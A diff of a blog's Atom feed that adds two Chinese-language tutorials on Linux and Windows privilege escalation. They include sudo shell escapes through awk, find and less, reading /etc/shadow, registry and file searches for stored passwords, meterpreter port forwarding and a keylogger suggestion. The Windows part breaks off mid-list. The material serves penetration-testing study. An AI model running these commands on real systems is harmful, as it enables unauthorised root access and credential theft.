@@ -843,16 +843,92 @@
     <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
     <published>2017-10-10T04:35:24.000Z</published>
-    <updated>2018-02-27T01:02:31.404Z</updated>
+    <updated>2018-11-26T09:08:17.215Z</updated>
     
-    <content type="html"><![CDATA[<p>#### </p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="external">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">A guide to Linux Privilege Escalation</a></p>
+    <content type="html"><![CDATA[<h2 id="brief"><a href="#brief" class="headerlink" title="brief"></a>brief</h2><ul>
+<li>当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等。</li>
+<li>这节中我们主要介绍一些常见的linux的权限提升的技巧<br>这其中包括<br>1.内核提权<br>2.以root权限运行的程序<br>3.已安装的软件<br>4.弱口令和明文密码<br>5.内部的服务<br>6.suid的错误配置<br>7.滥用sudo权限<br>8.以root权限运行的脚本文件<br>9.错误的路径配置<br>10.计划任务<br>11.未装载的文件系统<h2 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h2></li>
+<li>我之前用三个脚本来枚举一个机器的基本信息，这三个脚本有些不同，但是输出都很相似，所以选择一个你喜欢的就可以。<br><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">LinEnum</a></li>
+<li>以下是基本的选项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-k Enter keyword</div><div class="line">-e Enter export location</div><div class="line">-t Include thorough (lengthy) tests</div><div class="line">-r Enter report name</div><div class="line">-h Displays this help text</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="external">Unix privesc</a><br><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="external">Linprivchecker.py</a></p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><ul>
+<li>利用linux的内核漏洞有时可以提升我们的权限，我们需要提前测试内核explicit是否对当前的系统、架构以及内核版本是有效的。</li>
+<li>查看系统、架构、内核版本命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">cat /proc/version</div><div class="line">cat /etc/issue</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">site:exploit-db.com kernel version</div><div class="line"></div><div class="line">python linprivchecker.py extended</div></pre></td></tr></table></figure>
+<ul>
+<li>能不用内核漏洞提权尽量就不要用，因为他可能会导致系统崩溃或者使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中，<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
+<li>这个方法的原理就是如果一个IE服务是以root权限运行的，那么你可以让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li>
+<li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># Metasploit</div><div class="line">ps</div><div class="line"></div><div class="line"># Linux</div><div class="line">ps aux</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul>
+<li>如果你发现mysql是你root权限运行的，登录到mysql然后执行下面的命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select sys_exec(&apos;whoami&apos;);</div><div class="line">select sys_eval(&apos;whoami&apos;);</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>如果这个不行你可以使用UDF进行提权.<a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="external">UDF提权</a></p>
+<h2 id="用户安装的软件"><a href="#用户安装的软件" class="headerlink" title="用户安装的软件"></a>用户安装的软件</h2><ul>
+<li>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># Common locations for user installed software</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2><ul>
+<li>检查一下web服务器连接数据库的配置文件(例如config.php)</li>
+<li>检查一下数据库的管理员密码，这个密码可能是重用了的。</li>
+<li><p>检测一下弱口令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">username:username</div><div class="line">username:username1</div><div class="line">username:root</div><div class="line">username:admin</div><div class="line">username:qwerty</div><div class="line">username:password</div></pre></td></tr></table></figure>
+</li>
+<li><p>检查一下明文密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Anything interesting the the mail?</div><div class="line">/var/spool/mail</div><div class="line"></div><div class="line">./LinEnum.sh -t -k password</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="只能内部访问的服务"><a href="#只能内部访问的服务" class="headerlink" title="只能内部访问的服务"></a>只能内部访问的服务</h2><ul>
+<li>一些服务可能只是对内开放，外部是访问不了的，比如说部署服务器、数据库或者其它，这些服务可以是以root权限运行的，这些服务恰恰有可能是有漏洞的，因为开发者或者用户可能会认为因为服务只是内部使用所以就放松了警惕。</li>
+<li>使用netstat对比一下nmap的扫描结果<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Linux</div><div class="line">netstat -anlp</div><div class="line">netstat -ano</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="suid和guid错误配置"><a href="#suid和guid错误配置" class="headerlink" title="suid和guid错误配置"></a>suid和guid错误配置</h2><ul>
+<li>查找suid和guid的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#Find SUID</div><div class="line">find / -perm -u=s -type f 2&gt;/dev/null</div><div class="line"></div><div class="line">#Find GUID</div><div class="line">find / -perm -g=s -type f 2&gt;/dev/null</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="滥用sudo权限"><a href="#滥用sudo权限" class="headerlink" title="滥用sudo权限"></a>滥用sudo权限</h2><ul>
+<li>如果你的shell可以通过sudo 去访问某些程序，这个时候就有可能提升你的权限，例如如果你可以sudo cp，那么你就可以覆盖/etc/shadow 或者/etc/sudoers </li>
+<li>这些命令有 awk、bash、cp等</li>
+<li><p>awk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>find</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo find / -exec bash -i \;</div><div class="line"></div><div class="line">find / -exec /usr/bin/awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos; ;</div></pre></td></tr></table></figure>
+</li>
+<li><p>less</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo less /etc/shadow</div><div class="line">v</div><div class="line">:shell</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">更多参考</a></p>
+<h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2><ul>
+<li>如果你发现一个脚本是root所有但是可以被任何用户写，这个可以你就可以添加你恶意的代码到这脚本中从而实现提权操作。这些脚本可能是计划任务。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="错误的路径配置"><a href="#错误的路径配置" class="headerlink" title="错误的路径配置"></a>错误的路径配置</h2><p><a href="https://hackmag.com/security/reach-the-root/" target="_blank" rel="external">link1</a><br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank" rel="external">link2</a></p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><ul>
+<li>查看属于高权限用户但是你有写权限的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">crontab -l</div><div class="line">ls -alh /var/spool/cron</div><div class="line">ls -al /etc/ | grep cron</div><div class="line">ls -al /etc/cron*</div><div class="line">cat /etc/cron*</div><div class="line">cat /etc/at.allow</div><div class="line">cat /etc/at.deny</div><div class="line">cat /etc/cron.allow</div><div class="line">cat /etc/cron.deny</div><div class="line">cat /etc/crontab</div><div class="line">cat /etc/anacrontab</div><div class="line">cat /var/spool/cron/crontabs/root</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="未挂载的文件系统"><a href="#未挂载的文件系统" class="headerlink" title="未挂载的文件系统"></a>未挂载的文件系统</h2><ul>
+<li>查看未挂载的系统磁盘，如果成功挂载之后，那么就可以从头开始检查一下权限提升的步骤。<h2 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h2><h2 id="通过键盘记录仪窃取密码"><a href="#通过键盘记录仪窃取密码" class="headerlink" title="通过键盘记录仪窃取密码"></a>通过键盘记录仪窃取密码</h2></li>
+<li>如果你有sudo权限 但是你没有密码这个时候你可以安装个键盘记录仪。<h2 id="其它有用的和提权相关的东西"><a href="#其它有用的和提权相关的东西" class="headerlink" title="其它有用的和提权相关的东西"></a>其它有用的和提权相关的东西</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/tmp</div><div class="line">/var/tmp</div><div class="line">/dev/shm</div><div class="line">/var/spool/vbox</div><div class="line">/var/spool/samba</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h2><p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="external">unix-privesc-check</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html" target="_blank" rel="external">privilege<em>escalation</em>-_linux</a><br><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="external">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">A guide to Linux Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=-i4O_hjc87Y" target="_blank" rel="external">nmap提权</a><br><a href="https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref" target="_blank" rel="external">linux提权实战</a></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;#### &lt;/p&gt;
-&lt;h4 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/
+      &lt;h2 id=&quot;brief&quot;&gt;&lt;a href=&quot;#brief&quot; class=&quot;headerlink&quot; title=&quot;brief&quot;&gt;&lt;/a&gt;brief&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等
     
     </summary>
     
@@ -878,6 +954,151 @@
     
       &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;ELF(Executable and Linkable Format)可执行和可链接格式。&lt;h4 id=&quot;动态链接库&quot;&gt;&lt;a h
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>windows权限提升(二)</title>
+    <link href="http://kevien.github.io/2017/10/01/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BA%8C)/"/>
+    <id>http://kevien.github.io/2017/10/01/windows权限提升(二)/</id>
+    <published>2017-10-01T03:39:24.000Z</published>
+    <updated>2018-11-26T09:15:55.196Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2><ul>
+<li>在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># Basics</div><div class="line">systeminfo</div><div class="line">hostname</div><div class="line"></div><div class="line"># Who am I?</div><div class="line">whoami</div><div class="line">echo %username%</div><div class="line"></div><div class="line"># What users/localgroups are on the machine?</div><div class="line">net users</div><div class="line">net localgroups</div><div class="line"></div><div class="line"># More info about a specific user. Check if user has privileges.</div><div class="line">net user user1</div><div class="line"></div><div class="line"># View Domain Groups</div><div class="line">net group /domain</div><div class="line"></div><div class="line"># View Members of Domain Group</div><div class="line">net group /domain &lt;Group Name&gt;</div><div class="line"></div><div class="line"># Firewall</div><div class="line">netsh firewall show state</div><div class="line">netsh firewall show config</div><div class="line"></div><div class="line"># Network</div><div class="line">ipconfig /all</div><div class="line">route print</div><div class="line">arp -A</div><div class="line"></div><div class="line"># How well patched is the system?</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div><div class="line"></div><div class="line">#Find all those strings in config files.</div><div class="line">dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Find all passwords in all files.</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line">findstr /spin &quot;password&quot; *.*</div></pre></td></tr></table></figure>
+<h3 id="关键文件查找"><a href="#关键文件查找" class="headerlink" title="关键文件查找"></a>关键文件查找</h3><ul>
+<li>在这些常见的文件中查找，其中有些可能是base64编码的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">c:\unattend.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div><div class="line"></div><div class="line">dir c:\*vnc.ini /s /b</div><div class="line">dir c:\*ultravnc.ini /s /b </div><div class="line">dir c:\ /s /b | findstr /si *vnc.ini</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># VNC</div><div class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</div><div class="line"></div><div class="line"># Windows autologin</div><div class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</div><div class="line"></div><div class="line"># SNMP Paramters</div><div class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</div><div class="line"></div><div class="line"># Putty</div><div class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</div><div class="line"></div><div class="line"># Search for password in registry</div><div class="line">reg query HKLM /f password /t REG_SZ /s</div><div class="line">reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
+<h2 id="仅对内网提供的服务"><a href="#仅对内网提供的服务" class="headerlink" title="仅对内网提供的服务"></a>仅对内网提供的服务</h2><ul>
+<li><p>有时候一些服务只是允许内网用户访问，例如一个mysql服务器为了安全不允许外部进行连接。此外一些拥有高权限的程序往往也是针对内网的网络或者机器。例如打印机接口等。这些服务服务往往是很脆弱的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div></pre></td></tr></table></figure>
+</li>
+<li><p>可能输出如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Proto  Local address      Remote address     State        User  Inode  PID/Program name</div><div class="line">    -----  -------------      --------------     -----        ----  -----  ----------------</div><div class="line">    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -</div><div class="line">    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -</div><div class="line">    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -</div><div class="line">    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -</div></pre></td></tr></table></figure>
+</li>
+<li><p>注意监听的端口，对比一下你从外网扫描到的结果，这里面有没有是你外网访问不到的？</p>
+</li>
+<li><p>如果是这样的，你可以通过端口转发来连接它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Port forward using plink</div><div class="line">plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080</div><div class="line"></div><div class="line"># Port forward using meterpreter</div><div class="line">portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;</div><div class="line">portfwd add -l 3306 -p 3306 -r 192.168.1.101</div></pre></td></tr></table></figure>
+</li>
+<li><p>那么我们怎么解释netstat命令的输出呢？</p>
+<h4 id="本地地址-0-0-0-0"><a href="#本地地址-0-0-0-0" class="headerlink" title="本地地址 0.0.0.0"></a>本地地址 0.0.0.0</h4></li>
+<li>本地地址0.0.0.0意味着这个服务监听所有的接口，这个意味着你可以所有人都可以连接。<h4 id="本地地址-127-0-0-1"><a href="#本地地址-127-0-0-1" class="headerlink" title="本地地址 127.0.0.1"></a>本地地址 127.0.0.1</h4></li>
+<li>本地地址127.0.0.1意味着只能接受本台pc的连接，不运行任何其它地方的连接。<h4 id="本地地址-192-168-1-9"><a href="#本地地址-192-168-1-9" class="headerlink" title="本地地址 192.168.1.9"></a>本地地址 192.168.1.9</h4></li>
+<li>本地地址192.168.1.9意味着只是监听来自本地网络的连接，所以只有本地的网络可以连接它，外网是不能连接的。<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2></li>
+<li>内核提权应该是我们最后万不得已才使用的方法，因为它往往容易导致系统不稳定或造成其它方面的问题。</li>
+<li>首先来看一下系统的补丁情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">systeminfo</div><div class="line"># or</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="python-转换成二进制文件"><a href="#python-转换成二进制文件" class="headerlink" title="python 转换成二进制文件"></a>python 转换成二进制文件</h4><ul>
+<li>如果我们的exploit是用python写的，但是受害机又没有python环境，我们这个时候可以使用pyinstaller或者其它工具将其转换成二进制文件。<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2></li>
+<li><p>我们通过如下的命令查看任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /query /fo LIST /v</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个输出可能会很多，这个时候可以通过使用findstr命令进行一下过滤，我往往是将其粘贴到txt文档中，然后通过linux命令进行查找。虽然不是很优雅，但是能解决<br>问题，你也可以修改SYSTEM为其它的高权限用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="脆弱的服务权限"><a href="#脆弱的服务权限" class="headerlink" title="脆弱的服务权限"></a>脆弱的服务权限</h2><ul>
+<li>服务是windows上没有图形化界面运行在后台的程序。</li>
+<li>如果你发现一个服务允许everyone写，那么你可以将你的二进制文件写到这个目录并让它去执行。</li>
+<li><p>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe</p>
+<h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</p>
+</li>
+<li>如下的命令用于查看运行文件在非system32目录下的服务，并且使用icacls查看对应的权限。前提是你能够使用wmic，且你在c:\windows\temp目录有些权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for /f &quot;tokens=2 delims=&apos;=&apos;&quot; %a in (&apos;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&apos;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</div><div class="line"></div><div class="line">for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/01/windows权限提升(二)/wmic.png" alt=""></p>
+<ul>
+<li><p>system32目录被排除了，因为他们大多是正确的，一般都是系统创建的。</p>
+<h3 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt</div><div class="line"></div><div class="line">FOR /F %i in (Servicenames.txt) DO echo %i</div><div class="line">type Servicenames.txt</div><div class="line"></div><div class="line">FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt</div><div class="line"></div><div class="line">FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</div></pre></td></tr></table></figure>
+</li>
+<li><p>现在你就可以使用cacls命令来逐个查看每个文件权限了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cacls &quot;C:\path\to\file.exe&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="查看脆弱点"><a href="#查看脆弱点" class="headerlink" title="查看脆弱点"></a>查看脆弱点</h3><ul>
+<li><p>我们需要关注的是用户安装的二进制文件，而不是系统自带的，而且我们想要找的是这样权限的 BUILTIN\Users:(F) ，就是内建用户拥有所有权限的，或者是user/usergroup有F或者C权限的。<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\path\to\file.exe </div><div class="line">BUILTIN\Users:F</div><div class="line">BUILTIN\Power Users:C </div><div class="line">BUILTIN\Administrators:F </div><div class="line">NT AUTHORITY\SYSTEM:F</div></pre></td></tr></table></figure>
+</li>
